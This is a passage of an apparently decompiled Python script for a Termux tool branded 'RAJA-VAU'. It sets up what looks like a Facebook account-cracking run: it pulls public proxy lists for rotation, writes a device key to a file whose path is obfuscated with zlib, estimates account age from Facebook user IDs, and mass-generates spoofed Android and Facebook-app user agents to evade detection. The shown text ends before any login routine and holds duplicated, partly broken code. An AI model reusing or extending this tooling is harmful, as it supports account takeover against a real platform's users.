global cps
global loop
global sim_id
global oks
import os
import json
import os
import time
import zlib
import sys
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes
from fake_useragent import UserAgent
import time
import datetime
import os
import platform
import time
import sys
import subprocess

os.system('clear')

try:
    import requests
except ImportError:
    print('\033[1;92m[+] requests module not found, installing...\033[0m')
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=False)

print('\033[1;92m[+] Git update running...\033[0m')
subprocess.run(['git', 'pull'], check=False)

bit = platform.architecture()[0]
if bit == '64bit':
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m YOU ARE 64BIT USER')
    time.sleep(4)
else:
    if bit == '32bit':
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m YOU ARE 32BIT USER')
        time.sleep(4)

princp = []
os.system('clear')
os.system('xdg-open https://chat.whatsapp.com/CRdHc8dxvpP3nvb7Gdb5CX?s=cl&p=a&ilr=1')
os.system('xdg-open https://t.me/RAJA VAUtooolbd')
os.system('xdg-open https://youtube.com/@RAJA VAU-520?si=3U_W3wkYl2cBQN0u')

folder = '/data/data/com.termux/files/home/.termux'
filepath = os.path.join(folder, '.error_name.txt')
os.makedirs(folder, exist_ok=True)

try:
    with open(filepath, 'r') as f:
        name = f.read().strip()
    if not name:
        raise FileNotFoundError
except FileNotFoundError:
    username = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m WHAT IS YOUR NAME : ')
    with open(filepath, 'w') as f:
        f.write(username)
    name = username
def load_proxies():
    proxy_urls = [
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt', 
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt', 
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/https.txt'
    ]
    proxies = []
    for url in proxy_urls:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies.extend([proxy.strip() for proxy in response.text.splitlines() if proxy.strip()])
        except requests.exceptions.RequestException:
            continue
    return proxies

proxies_list = load_proxies()

def get_random_proxy():
    if proxies_list:
        proxy = random.choice(proxies_list).strip()
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return None

proxies = get_random_proxy()
                                                
                                                                                                

# Fallback definitions to avoid NameError
logo = ''
filepath = 'file.txt'

os.system('clear')
print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] LOADING MODULES ')

try:
    import requests
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')

try:
    import concurrent.futures as concurrent
except ImportError:
    print('\033[38;5;46m[\033[1;97m✓\033[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

try:
    import platform
except ImportError:
    pass

oks, cps, loop, apk = [], [], 0, []
myid = uuid.uuid4().hex[:5].upper()

pathx = str(zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaz\xb9E\x89\xd9\x99y\xe9\x15\x15\x15\xba\xc9\xf9e\x00\xe7!\x13*')).replace('b\'', '').replace('\'', '')
try:
    key1 = open(pathx, 'r').read()
except:
    open(pathx, 'w').write(myid)

key1 = open(pathx, 'r').read() + str(os.getuid())

dic = {
    '1': 'JANUARY',
    '2': 'FEBRUARY',
    '3': 'MARCH',
    '4': 'APRIL',
    '5': 'MAY',
    '6': 'JUNE',
    '7': 'JULY',
    '8': 'AUGUST',
    '9': 'SEPTEMBER',
    '10': 'OCTOBER',
    '11': 'NOVEMBER',
    '12': 'DECEMBER'
}

dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December'
}

tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
date = str(bln) + '|' + str(tgl) + '|' + str(thn)

os.system('rm -rf /sdcard/..txt')
try:
    open('/sdcard/..txt', 'a').write(' ')
except:
    pass

try:
    with open(filepath, 'r') as f:
        name = f.read().strip()
except:
    name = ''

try:
    with open(filepath, 'r') as f:
        ___username___ = f.read().strip()
except:
    ___username___ = ''

sys.stdout.write('\033]2;<RAJA-VAU>\a')

def clear():
    os.system('clear')
    print(logo)

def linex():
    print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def creationyear(uid):
    """Estimates the Facebook account creation year based on the UID."""
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
            return '2009'
        elif uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        elif uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        elif uid.startswith(('100002', '100003')):
            return '2011'
        elif uid.startswith('100004'):
            return '2012'
        elif uid.startswith(('100005', '100006')):
            return '2013'
        elif uid.startswith(('100007', '100008')):
            return '2014'
        elif uid.startswith('100009'):
            return '2015'
        elif uid.startswith('10001'):
            return '2016'
        elif uid.startswith('10002'):
            return '2017'
        elif uid.startswith('10003'):
            return '2018'
        elif uid.startswith('10004'):
            return '2019'
        elif uid.startswith('10005'):
            return '2020'
        elif uid.startswith('10006'):
            return '2021'
        elif uid.startswith(('10007', '10008')):
            return '2022'
        elif uid.startswith('10009'):
            return '2023'
        else:
            return ''
    elif len(uid) in [9, 10]:
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
            return ''
def ashaa(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return ' (*-*) 2009 √'
        elif uid.startswith('100000000'):
            return ' ACCOUNT  2009 √'
        elif uid.startswith('10000000'):
            return ' ACCOUNT 2009 √'
        elif uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return ' ACCOUNT 2009 √'
        elif uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return ' ACCOUNT 2010 √'
        elif uid.startswith('100001'):
            return ' ACCOUNT 2010/2011 √'
        elif uid.startswith(('100002', '100003')):
            return ' ACCOUNT 2011/2012 √'
        elif uid.startswith('100004'):
            return ' ACCOUNT 2012/2013 √'
        elif uid.startswith(('100005', '100006')):
            return ' ACCOUNT 2013/2014 √'
        elif uid.startswith(('100007', '100008')):
            return ' ACCOUNT 2014/2015 √'
        elif uid.startswith('100009'):
            return ' ACCOUNT 2015 √'
        elif uid.startswith('10001'):
            return ' ACCOUNT 2015/2016 √'
        elif uid.startswith('10002'):
            return ' ACCOUNT 2016/2017 √'
        elif uid.startswith('10003'):
            return ' ACCOUNT 2018/2019 √'
        elif uid.startswith('10004'):
            return ' ACCOUNT 2019/2020 √'
        elif uid.startswith('10005'):
            return ' ACCOUNT 2020 √'
        elif uid.startswith(('10006', '10007')):
            return ' ACCOUNT 2021 √'
        elif uid.startswith('10008'):
            return ' ACCOUNT 2022 √'
        elif uid.startswith('10009'):
            return ' ACCOUNT 2023 √'
        elif uid.startswith('6155'):
            return ' NEW ACCOUNT√'
        else:
            return ''
    elif len(uid) in [9, 10]:
        return ' ACCOUNT 2008/2009 √'
    elif len(uid) == 8:
        return ' ACCOUNT 2007/2008 √'
    elif len(uid) == 7:
        return ' ACCOUNT 2006/2007 √'
    else:
        return ''

def ashaa(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return ' (*-*) 2009 √'
        elif uid.startswith('100000000'):
            return ' ACCOUNT  2009 √'
        elif uid.startswith('10000000'):
            return ' ACCOUNT 2009 √'
        elif uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return ' ACCOUNT 2009 √'
        elif uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return ' ACCOUNT 2010 √'
        elif uid.startswith('100001'):
            return ' ACCOUNT 2010/2011 √'
        elif uid.startswith(('100002', '100003')):
            return ' ACCOUNT 2011/2012 √'
        elif uid.startswith('100004'):
            return ' ACCOUNT 2012/2013 √'
        elif uid.startswith(('100005', '100006')):
            return ' ACCOUNT 2013/2014 √'
        elif uid.startswith(('100007', '100008')):
            return ' ACCOUNT 2014/2015 √'
        elif uid.startswith('100009'):
            return ' ACCOUNT 2015 √'
        elif uid.startswith('10001'):
            return ' ACCOUNT 2015/2016 √'
        elif uid.startswith('10002'):
            return ' ACCOUNT 2016/2017 √'
        elif uid.startswith('10003'):
            return ' ACCOUNT 2018/2019 √'
        elif uid.startswith('10004'):
            return ' ACCOUNT 2019/2020 √'
        elif uid.startswith('10005'):
            return ' ACCOUNT 2020 √'
        elif uid.startswith(('10006', '10007')):
            return ' ACCOUNT 2021 √'
        elif uid.startswith('10008'):
            return ' ACCOUNT 2022 √'
        elif uid.startswith('10009'):
            return ' ACCOUNT 2023 √'
        elif uid.startswith('6155'):
            return ' NEW ACCOUNT√'
        else:
            return ''
    elif len(uid) in [9, 10]:
        return ' ACCOUNT 2008/2009 √'
    elif len(uid) == 8:
        return ' ACCOUNT 2007/2008 √'
    elif len(uid) == 7:
        return ' ACCOUNT 2006/2007 √'
    else:
        return ''

def asha(ids):
    if len(ids) == 15:
        if ids.startswith('1000000000'):
            return ' (*-*) 2009 √'
        elif ids.startswith('100000000'):
            return ' ACCOUNT  2009 √'
        elif ids.startswith('10000000'):
            return ' ACCOUNT 2009 √'
        elif ids.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return ' ACCOUNT 2009 √'
        elif ids.startswith(('1000006', '1000007', '1000008', '1000009')):
            return ' ACCOUNT 2010 √'
        elif ids.startswith('100001'):
            return ' ACCOUNT 2010/2011 √'
        elif ids.startswith(('100002', '100003')):
            return ' ACCOUNT 2011/2012 √'
        elif ids.startswith('100004'):
            return ' ACCOUNT 2012/2013 √'
        elif ids.startswith(('100005', '100006')):
            return ' ACCOUNT 2013/2014 √'
        elif ids.startswith(('100007', '100008')):
            return ' ACCOUNT 2014/2015 √'
        elif ids.startswith('100009'):
            return ' ACCOUNT 2015 √'
        elif ids.startswith('10001'):
            return ' ACCOUNT 2015/2016 √'
        elif ids.startswith('10002'):
            return ' ACCOUNT 2016/2017 √'
        elif ids.startswith('10003'):
            return ' ACCOUNT 2018/2019 √'
        elif ids.startswith('10004'):
            return ' ACCOUNT 2019/2020 √'
        elif ids.startswith('10005'):
            return ' ACCOUNT 2020 √'
        elif ids.startswith(('10006', '10007')):
            return ' ACCOUNT 2021 √'
        elif ids.startswith('10008'):
            return ' ACCOUNT 2022 √'
        elif ids.startswith('10009'):
            return ' ACCOUNT 2023 √'
        elif ids.startswith('6155'):
            return ' NEW ACCOUNT√'
        else:
            return ''
    elif len(ids) in [9, 10]:
        return ' ACCOUNT 2008/2009 √'
    elif len(ids) == 8:
        return ' ACCOUNT 2007/2008 √'
    elif len(ids) == 7:
        return ' ACCOUNT 2006/2007 √'
    else:
        return ''


ua = UserAgent()

def ugenX():
    ualist = [ua.random for _ in range(50)]
    return str(random.choice(ualist))

ugen = []
user_agents = []

for xd in range(10000):
    rr = random.randint
    build_b = random.choice(['001', '002', '003', '011', '012', '014', '015', '020', '021', '022', '023', '024'])
    bl_typ = random.choice(['TKQ1', 'SKQ1', 'TP1A', 'RKQ1', 'SP1A', 'RP1A', 'PPR1', 'QP1A'])
    oppo = random.choice(['CPH2461', 'CPH2451', 'PCGM00', 'PBBM00', 'PFZM10', 'PGGM10', 'PECT30', 'PCHM10', 'PEAT00', 'PEYM00', 'PESM10', 'PFGM00'])
    infinix = random.choice(['Infinix X669C', 'Infinix X6823', 'Infinix X676C', 'Infinix X683', 'Infinix X689C', 'Infinix X6811', 'Infinix X612B', 'Infinix X6810', 'Infinix X665E'])
    redmi = random.choice(['2211133G', 'M2004J19C', '22041219I', '22101316UG', '2209116AG', 'M2010J19SY', 'M2012K11C', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 5'])
    um2 = f'Mozilla/5.0 (Linux; Android {str(rr(6, 12))}; {oppo} Build/{bl_typ}.{str(rr(120000, 220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80, 114))}.0.{str(rr(4200, 5400))}.{str(rr(70, 150))} Mobile Safari/537.36'
    um1 = f'Mozilla/5.0 (Linux; Android {str(rr(6, 12))}; {redmi} Build/{bl_typ}.{str(rr(120000, 220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80, 114))}.0.{str(rr(4200, 5400))}.{str(rr(70, 150))} Mobile Safari/537.36'
    um3 = f'Mozilla/5.0 (Linux; Android {str(rr(6, 12))}; {infinix} Build/{bl_typ}.{str(rr(120000, 220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80, 114))}.0.{str(rr(4200, 5400))}.{str(rr(70, 150))} Mobile Safari/537.36'
    um4 = f'Mozilla/5.0 (Linux; Android {str(rr(6, 12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100, 114))}.0.{str(rr(4900, 5700))}.{str(rr(70, 150))} Mobile Safari/537.36'
    ugen.append(um2)
    ugen.append(um3)
    ugen.append(um1)
    ugen.append(um4)

for xhd in range(1000):
    a = random.choice(['de-at', 'in-id', 'ms-my', 'uk-ua', 'en-us', 'en-gb', 'id-id', 'de-de', 'ru-ru', 'en-sg', 'fr-fr', 'fa-ir', 'ja-jp', 'pt-br', 'cs-cz', 'zh-hk', 'zh-cn', 'vi-vn', 'en-ph', 'en-in', 'tr-tr', 'en-au', 'th-th', 'hi-in', 'zh-tw', 'my-zg', 'en-nz', 'en-ca', 'es-mx', 'ko-kr', 'el-gr', 'en-ez', 'ar-ae', 'fr-ch', 'nl-nl', 'gu-in'])
    b = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    b2 = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c2 = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    d = f'Mozilla/5.0 (Linux; U; Android {str(random.randint(6, 14))}; {a}; OPPO {b}{str(random.randint(10, 99))}{c} Build/{str(random.randint(2500, 5900))}{str(random.randint(10, 80))}{str(random.randint(200, 900))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(47, 70))}.{str(random.randint(8, 20))}.{str(random.randint(1, 9))}'
    ugen.append(d)

for xd in range(1000):
    rr = random.randint
    rc = random.choice
    aZ = str(rc(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    lonte = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11, 99))}{str(rc(aZ))}'
    build_nokiax = ['JDQ39', 'JZO54K']
    RMX3142 = ['CPH1869', 'CPH1929', 'CPH2107', 'CPH2238', 'CPH2389', 'CPH2401', 'CPH2407', 'CPH2413', 'CPH2415', 'CPH2417', 'CPH2419', 'CPH2455', 'CPH2459', 'CPH2461', 'CPH2471', 'CPH2473', 'CPH2477', 'CPH8893', 'CPH2321', 'CPH2341', 'CPH2373', 'CPH2083', 'CPH2071', 'CPH2077', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH1923', 'CPH1925', 'CPH1837', 'CPH2015', 'CPH2073', 'CPH2081', 'CPH2029', 'CPH2031', 'CPH2137', 'CPH1605', 'CPH1803', 'CPH1853', 'CPH1805', 'CPH1809', 'CPH1851', 'CPH1931', 'CPH1959', 'CPH1933', 'CPH1935', 'CPH1943']
    M2105K81C = ['2201116SI', 'M2012K11AI', '22011119TI', '21091116UI', 'M2102K1AC', 'M2012K11I', '22041219I', '22041216I', '2203121C', '2106118C', '2201123G', '2203129G', '2201122G', '2201122C', '2206122SC', '22081212C', '2112123AG', '2112123AC', '2109119BC', 'M2002J9G', 'M2007J1SC', 'M2007J17I', 'M2102J2SC', 'M2007J3SY', 'M2007J17G', 'M2007J3SG', 'M2011K2G', 'M2101K9AG ', 'M2101K9R', '2109119DG', 'M2101K9G', '2109119DI', 'M2012K11G', 'M2102K1G', '21081111RG', '2107113SG', '21051182G', 'M2105K81AC']
    RMX3142_2 = ['RMX3516', 'RMX3371', 'RMX3461', 'RMX3286', 'RMX3561', 'RMX3388', 'RMX3311', 'RMX3142', 'RMX2071', 'RMX1805', 'RMX1809', 'RMX1801', 'RMX1807', 'RMX1803', 'RMX1825', 'RMX1821', 'RMX1822', 'RMX1833', 'RMX1851', 'RMX1853', 'RMX1827', 'RMX1911', 'RMX1919', 'RMX1927', 'RMX1971', 'RMX1973', 'RMX2030', 'RMX2032', 'RMX1925', 'RMX1929', 'RMX2001', 'RMX2061', 'RMX2063', 'RMX2040', 'RMX2042', 'RMX2002', 'RMX2151', 'RMX2163', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3474', 'RMX3471', 'RMX3472']
    RMX3142_3 = ['X676B', 'X687', 'X609', 'X697', 'X680D', 'X507', 'X605', 'X668', 'X6815B', 'X624', 'X655F', 'X689C', 'X608', 'X698', 'X682B', 'X682C', 'X688C', 'X688B', 'X658E', 'X659B', 'X689B', 'X689', 'X689D', 'X662', 'X662B', 'X675', 'X6812B', 'X6812', 'X6817B', 'X6817', 'X6816C', 'X6816', 'X6816D', 'X668C', 'X665B', 'X665E', 'X510', 'X559C', 'X559F', 'X559', 'X606', 'X606C', 'X606D', 'X623', 'X624B', 'X625C', 'X625D', 'X625B', 'X650D', 'X650B']
    # Decompiler error: line too long for translation. Please decompile this statement manually.
    GT_7205 = ['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550', '5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105']
    strvoppo = f'Mozilla/5.0 (Linux; Android {str(rr(1, 11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(1, 10))}.{str(rr(111, 5555))}.{str(rr(111, 99999))}'
    strvredmi = f'Mozilla/5.0 (Linux; Android {str(rr(1, 11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))} Mobile Safari/537.36'
    strvoppo1 = f'Mozilla/5.0 (Linux; Android {str(rr(1, 11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))} Mobile Safari/537.36'
    strvinfinix = f'Mozilla/5.0 (Linux; Android {str(rr(1, 11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))} Mobile Safari/537.36'
    strvsamsung = f'Mozilla/5.0 (Linux; Android {str(rr(1, 11))}; {str(rc(RMX3142))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))} Mobile Safari/537.36'
    strvredmi1 = f'Mozilla/5.0 (Linux; Android {str(rr(1, 11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(1, 10))}.{str(rr(111, 5555))}.{str(rr(111, 99999))}'
    strvnokiax = f'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100, 104))}.0.{str(rr(3900, 4900))}.{str(rr(40, 150))}.1.{str(rr(16, 37))} {str(rc(aZ))}{str(rr(1, 1000))}'
    strvgt = f'Mozilla/5.0 (Linux; Android {str(rr(4, 12))}; {str(rc(GT_7205))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100, 104))}.0.{str(rr(3900, 4900))}.{str(rr(40, 150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1, 1000))}'
    ugen.append(strvoppo)
    ugen.append(strvredmi)
    ugen.append(strvoppo1)
    ugen.append(strvinfinix)
    ugen.append(strvsamsung)
    ugen.append(strvredmi1)
    ugen.append(strvnokiax)
    ugen.append(strvgt)

for op in range(1000):
    rr = random.randint
    rc = random.choice
    bahasa = random.choice(['en', 'fr', 'ru', 'tr', 'id', 'pt', 'es', 'en-GB'])
    ua1 = f'Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
    ua2 = f'SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
    ua3 = f'Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
    ua4 = f'Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
    ua5 = f'Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
    ugen.append(ua1)
    ugen.append(ua2)
    ugen.append(ua3)
    ugen.append(ua4)
    ugen.append(ua5)

for generate in range(100):
    a = random.randrange(1, 9)
    b = random.randrange(1, 9)
    c = random.randrange(7, 13)
    c = random.randrange(73, 100)
    d = random.randrange(4200, 4900)
    e = random.randrange(40, 150)
    uaku = f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    ugen.append(uaku)

def sawg():
    model = random.choice(['Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 6', 'Redmi 7', 'Redmi 8'])
    fbav = f'{random.randint(10, 100)}.0.0.{random.randint(4000, 5000)}'
    fbbv = str(random.randint(4000000, 5000000))
    ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=2.75,width=1080,height=2168}};FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a;]'
    return ua

def sex_ua():
    fbav3 = f'{random.randint(191, 505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39, 69)}.{random.randint(64, 154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&t', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf3 = 'samsung'
    fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5, 11)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android'])
    fbpn3, fban3 = (fb3.split('|')[1], fb3.split('|')[0])
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'FBOP/1;FBCA/arm64-v8a:;]'])
    ___ERROR_ON_FIRE___ = '[FBAN/' + str(fban3) + ';FBAV/' + str(fbav3) + ';FBBV/' + str(fbbv3) + ';FBDM/{density=' + str(density3) + ',width=' + str(width3) + ',height=' + str(height3) + '};FBLC/' + str(fblc3) + ';FBRV/' + str(fbpn3) + ';FBDV/' + str(fbdv3) + ';' + str(bit3) + ''
    return ___ERROR_ON_FIRE___
def sex_uaa():
    fbav3 = f'{random.randint(191, 505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39, 69)}.{random.randint(64, 154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&amp-T', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf3 = 'samsung'
    fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5, 11)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android'])
    fbpn3, fban3 = (fb3.split('|')[1], fb3.split('|')[0])
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]', 'FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/' + str(fban3) + ';FBAV/' + str(fbav3) + ';FBBV/' + str(fbbv3) + ';FBDM/{density=' + str(density3) + ',width=' + str(width3) + ',height=' + str(height3) + '};FBLC/' + str(fblc3) + ';FBRV/' + str(fbpn3) + ';FBDV/' + str(fbdv3) + ';' + str(bit3) + ''
